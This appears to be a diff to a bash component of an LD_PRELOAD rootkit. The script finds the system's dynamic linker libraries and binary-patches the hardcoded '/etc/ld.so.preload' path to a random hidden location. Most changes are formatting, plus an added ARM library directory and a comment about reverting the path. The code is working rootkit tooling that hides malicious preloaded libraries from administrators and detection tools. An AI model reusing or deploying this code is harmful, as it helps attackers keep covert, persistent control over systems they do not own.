@@ -1,7 +1,9 @@
 #!/bin/bash
 
 # dirs to scan for dynamic linker libs
-declare -a array LIB_DIRS=("/lib/" "/lib/x86_64-linux-gnu/" "/lib/i386-linux-gnu/" "/lib32/" "/libx32/" "/lib64/")
+declare -a array LIB_DIRS=("/lib/" "/lib32/" "/libx32/" "/lib64/" \
+                           "/lib/x86_64-linux-gnu/" "/lib/i386-linux-gnu/" \
+                           "/lib/arm-linux-gnueabihf/")
 
 # dirs that our new file location can live in
 declare -a array PDIRS=("/bin/" "/sbin/" "/etc/" "/home/" "/lib/" "/libx32/" "/lib64/" "/opt/" "/usr/" "/var/")
@@ -11,9 +13,7 @@ declare -a array LD_LIBS=() # later stores paths of dynamic linker libraries to 
 script_root="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
 source $script_root/util.sh
 
-get_ld_libs()
-{
-    #necho "Finding dynamic linker libraries"
+get_ld_libs(){
     local lib_dir
     for current_dir in ${LIB_DIRS[@]}; do
         [ ! -d $current_dir ] && continue
@@ -22,8 +22,7 @@ get_ld_libs()
     done
 }
 
-find_preload_location()
-{
+find_preload_location(){
     local strings_output lib
     [ -z ${LD_LIBS[0]} ] && get_ld_libs
     lib=${LD_LIBS[0]}
@@ -39,8 +38,7 @@ find_preload_location()
 get_new_preload(){ echo -n "`$script_root/get_rand_path.sh 2`.`random 'A-Za-z0-9' 8`"; }
 hstr(){ local HS="`xxd -p <<< "$1"`"; echo -n "${HS::${#HS}-2}00" | awk '{print toupper($0)}'; }
 
-patch_lib() # $1=target lib, $2=old preload file, $3=new preload file
-{
+patch_lib(){ # $1 = target lib, $2 = old preload file, $3 = new preload file
     [[ "`strings -a $1`" != *"$2"* ]] && return
     [ $2 == $3 ] && { necho "Skipping $1 (nothing to change)"; return; }
 
@@ -54,8 +52,10 @@ patch_lib() # $1=target lib, $2=old preload file, $3=new preload file
     mv $1.tmp $1
 }
 
-patch_dynamic_linker() # $1=old preload file
-{
+# if an optional argument is supplied to this function, it will be used
+# as the path for the new preload file location... this mainly should
+# be used for reverting the path back to /etc/ld.so.preload.
+patch_dynamic_linker(){
     local new_preload old_preload
     old_preload=$(find_preload_location)
     [ ! -z "$1" ] && new_preload="$1"
